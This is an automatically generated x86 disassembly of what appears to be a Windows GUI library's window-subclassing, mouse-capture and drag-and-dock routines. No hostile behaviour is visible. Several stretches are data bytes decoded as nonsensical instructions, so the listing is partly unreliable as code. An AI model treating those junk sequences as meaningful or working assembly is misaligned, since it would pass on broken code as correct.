add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add al al
push edi
inc ebp
add [ edx + ebp + 0x40 ] dl
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
cld
insd
dec ebp
jne r-xdata
add [ eax ] bl
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax + 0x2c ]
salc
inc esp
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add al al
push edi
inc ebp
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ edx + ebp + 0x40 ] dl
add [ 0x73754354 ] bl
je r-xdata
inc esp
add al cl
insb
nop
jl r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
inc edx
add [ esp + eax ] ch
inc edx
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
dec eax
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
je r-xdata
inc esp
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
stosd [ edi ]
add al ah
fiadd [ eax + eax - 0x38 ]
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
insb
je r-xdata
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
adc [ ebp + 0x44 ] ch
add [ edi ] al
sbb eax 0x73754354
je r-xdata
enter 0x41ab 0x0
je r-xdata
inc esp
add al bh
pushad
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
insd
dec ebp
jne r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc esp
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah cl
les eax [ eax + eax + 0x4 ]
push cs
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
outsd
insb
jae r-xdata
inc ebp
or [ eax - 0x18 ] dl
mov ah 0xfd
sti
[ ecx + 0x40000000 ]
je r-xdata
insb
inc esp
add [ edx + eax ] cl
add [ eax ] al
sub [ edx + 0x44 ] ch
add [ edi + eax ] dh
add [ ebp + 0x6bf40040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
insd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
call GetWindowLongA
test eax eax
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
std
sti
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insb
hlt
sub_446d58
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_446e10
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_446e44
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404464
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_446e10
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_446ea0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_447084
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c94c
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4044c4
mov eax edi
mov edx esi
call sub_403ff8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4470c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c94c
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4044c4
mov eax edi
mov edx esi
call sub_403ff8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44710c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_44b16c
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_447188
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov eax ebx
call sub_4507d8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_4471d0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx + 0x44 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax - 0x7e ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
push esp
movsb [ edi ] [ esi ]
inc ecx
add al bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax + ebp * 4 ] bl
inc ecx
add ah ch
jb r-xdata
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
mov ebx eax
test eax eax
je r-xdata
add [ 0x54090041 ] ah
push ebx
imul esi [ ebp + 0x4c ] 0x8b747369
rcl [ ebx + 0x56 ] 0x57
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_41a5d0
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_447234
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_41a5d0
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_447268
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_447290
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4027c4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_447268
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_447234
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a474
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a64c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4472ec
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41a4a8
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a5d0
mov edx 0x8
call sub_4027e4
inc esi
dec ebx
jne r-xdata
sub_447320
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_41a5d0
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_447234
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_447384
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_4473e4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031a4
mov edx esp
mov eax esi
call sub_404208
add esp 0x100
pop esi
pop ebx
retn
sub_447420
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4474ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_448540
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_447ec8
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e68
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_447ec8
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_448540
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_447ec8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_448540
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_4474ef
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_448540
sub_447548
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447572
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4475d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447384
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_447604
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403450
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_447630
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403450
xor edx edx
sub_447688
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_452440
sub_4476a8
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_452428
sub_4476cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4475b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aec
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42affc
mov edx eax
mov eax esi
call sub_423c68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_447730
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_447760
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4475d8
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4477bc
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403450
pop edi
pop esi
pop ebp
retn 0x4
sub_4477e0
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_447804
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4477e0
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4477e0
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4478c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44792c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_447d7c
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_446e44
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4507d8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4507d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4507d8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403450
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4478c0
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4507d8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4507d8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_447ac4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4507d8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4507d8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_447b08
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_447320
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44792c
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_41a5d0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_447ac4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403450
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44f2d0
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_447290
sub_447c64
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41a62c
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
